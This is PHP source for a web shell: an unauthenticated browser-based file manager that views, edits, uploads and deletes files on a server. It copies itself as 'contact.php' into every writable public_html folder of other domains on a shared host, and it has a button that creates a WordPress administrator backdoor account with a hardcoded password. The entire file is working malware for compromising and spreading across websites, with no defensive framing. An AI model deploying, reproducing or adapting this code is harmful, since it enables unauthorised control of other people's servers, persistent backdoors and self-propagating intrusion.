<?php

error_reporting(0);

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();

// === Handle Delete
if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    if ($target && strpos($target, getcwd()) === 0 && file_exists($target)) {
        if (is_dir($target)) {
            rmdir($target);
        } else {
            unlink($target);
        }
        echo "<p style='color:#f66;'>🗑️ Deleted: " . htmlspecialchars(basename($target)) . "</p>";
    }
}

// === Breadcrumb UI ===
function breadcrumb($path) {
    $parts = explode('/', trim($path, '/'));
    $built = '/';
    $html = "<strong>Current path:</strong> ";
    foreach ($parts as $part) {
        $built .= "$part/";
        $html .= "<a href='?path=" . urlencode($built) . "'>$part</a>/";
    }
    return $html;
}

// === Folder/file listing, folders first, alphabetically
function list_dir($path) {
    $out = '';
    $folders = $files = [];
    foreach (scandir($path) as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = "$path/$item";
        if (is_dir($full)) $folders[] = $item;
        else $files[] = $item;
    }
    natcasesort($folders); natcasesort($files);

    foreach ($folders as $f) {
        $full = "$path/$f";
        $out .= "<li>📁 <a href='?path=" . urlencode($full) . "'>$f</a> 
        | <a href='?delete=" . urlencode($full) . "' onclick=\"return confirm('Delete this folder?')\" style='color:#f66;'>🗑️ Delete</a></li>";
    }
    foreach ($files as $f) {
        $full = "$path/$f";
        $out .= "<li>📄 <a href='?path=" . urlencode($path) . "&view=" . urlencode($f) . "'>$f</a> 
        | <a href='?path=" . urlencode($path) . "&edit=" . urlencode($f) . "' style='color:#6cf'>✏️ Edit</a> 
        | <a href='?delete=" . urlencode($full) . "' onclick=\"return confirm('Delete this file?')\" style='color:#f66;'>🗑️ Delete</a></li>";
    }
    return $out;
}

// === View File
function view_file($path, $file) {
    $full = "$path/$file";
    if (!is_file($full)) return;
    echo "<h3>📄 Viewing: $file</h3><pre style='background:#111;padding:10px;color:#6f6;border:1px solid #444;'>";
    echo htmlspecialchars(file_get_contents($full));
    echo "</pre><hr>";
}

// === Edit File
function edit_file($path, $file) {
    $full = "$path/$file";
    if (!is_file($full)) return;
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($full, $_POST['content']);
        echo "<p style='color:#0f0;'>✅ Saved</p>";
    }
    $code = htmlspecialchars(file_get_contents($full));
    echo "<h3>✏️ Editing: $file</h3>
    <form method='post'>
        <textarea name='content' rows='20' style='width:100%;background:#111;color:#fff;'>$code</textarea><br>
        <button type='submit'>Save</button>
    </form><hr>";
}

// === Upload + Folder Creation
function upload_and_mkdir($path) {
    if (!empty($_FILES['up']['name'])) {
        move_uploaded_file($_FILES['up']['tmp_name'], "$path/" . basename($_FILES['up']['name']));
        echo "<p style='color:#0f0;'>📤 Uploaded</p>";
    }
    if (!empty($_POST['mkdir'])) {
        $target = "$path/" . basename($_POST['mkdir']);
        if (!file_exists($target)) {
            mkdir($target);
            echo "<p style='color:#0f0;'>📁 Folder created</p>";
        } else {
            echo "<p style='color:#f66;'>❌ Folder exists</p>";
        }
    }
    echo "<form method='post' enctype='multipart/form-data'>
        <input type='file' name='up'> <button>Upload</button></form><br>
    <form method='post'>
        📁 <input type='text' name='mkdir'> <button>Create Folder</button></form><br>";
}

// === Clone replication
function replicate_self($code) {
    static $done = false;
    if ($done) return [];
    $done = true;
    $dir = __DIR__;
    while ($dir !== '/') {
        if (preg_match('/\/u[\w\d]+$/', $dir) && is_dir("$dir/domains")) {
            $base = "$dir/domains";
            $urls = [];
            foreach (scandir($base) as $d) {
                if ($d === '.' || $d === '..') continue;
                $targetDir = "$base/$d/public_html";
                $targetFile = "$targetDir/contact.php";
                if (is_dir($targetDir) && is_writable($targetDir)) {
                    if (file_put_contents($targetFile, $code)) {
                        $urls[] = "http://$d/contact.php";
                    }
                }
            }
            return $urls;
        }
        $dir = dirname($dir);
    }
    return [];
}

// === Create WP Admin Button Logic
function handle_wp_injection($path) {
    if (!isset($_GET['create_wp_user'])) return;

    $wp = $path;
    while ($wp !== '/') {
        if (file_exists("$wp/wp-config.php")) break;
        $wp = dirname($wp);
    }

    if (!file_exists("$wp/wp-load.php")) {
        echo "<p style='color:#f66;'>❌ WordPress not found.</p>";
        return;
    }

    require_once("$wp/wp-load.php");

    $user = 'savvy';
    $pass = 'Jancok1234@123';
    $mail = 'savvy@domain.com';

    if (!username_exists($user) && !email_exists($mail)) {
        $uid = wp_create_user($user, $pass, $mail);
        $wp_user = new WP_User($uid);
        $wp_user->set_role('administrator');
        echo "<p style='color:#0f0;'>✅ WP Admin user 'savvy' created.</p>";
    } else {
        echo "<p style='color:#ff0;'>⚠️ User/email already exists.</p>";
    }
}

// === Prepare HTML
echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>#####</title>
<style>
body { background:#101010; color:#ddd; font-family:monospace; padding:20px; max-width:900px; margin:auto; }
a { color:#6cf; text-decoration:none; } a:hover { text-decoration:underline; }
pre, textarea { width:100%; background:#1a1a1a; color:#eee; border:1px solid #333; }
button { background:#6cf; border:none; color:#000; padding:6px 12px; margin-top:5px; }
ul { list-style:none; padding:0; }
</style></head><body>
<h2>h</h2><p>" . breadcrumb($path) . "</p><hr>";

// === Show WP User Button
echo "<form method='get'>
    <input type='hidden' name='path' value='" . htmlspecialchars($path) . "'>
    <button name='create_wp_user' value='1'>👤 Create WP Admin</button>
</form><br>";

handle_wp_injection($path);

// === Only show clone URLs in ORIGINAL shell
if (basename(__FILE__) !== 'contact.php') {
    $code = file_get_contents(__FILE__);
    $clones = replicate_self($code);
    if (!empty($clones)) {
        echo "<p style='color:#0f0;'>✅ Cloned to:</p><ul>";
        foreach ($clones as $u) echo "<li><a href='$u' target='_blank'>$u</a></li>";
        echo "</ul><hr>";
    }
}

// === Go Up
$up = dirname($path);
if ($up && $up !== $path) echo "<p>⬆️ <a href='?path=" . urlencode($up) . "'>Go up: $up</a></p>";

// === View/Edit/File Logic
if (isset($_GET['view'])) view_file($path, basename($_GET['view']));
if (isset($_GET['edit'])) edit_file($path, basename($_GET['edit']));

upload_and_mkdir($path);
echo "<ul>" . list_dir($path) . "</ul>";
echo "</body></html>";
?>
